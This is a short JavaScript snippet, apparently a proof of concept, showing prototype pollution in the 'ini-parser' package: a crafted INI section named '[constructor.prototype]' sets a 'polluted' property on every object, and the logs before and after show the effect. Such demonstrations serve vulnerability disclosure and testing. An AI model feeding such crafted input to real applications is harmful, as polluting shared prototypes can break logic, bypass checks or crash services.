console.log({}.polluted);
let a = require('ini-parser');
a.parse('[constructor.prototype]\npolluted=yes');
console.log({}.polluted);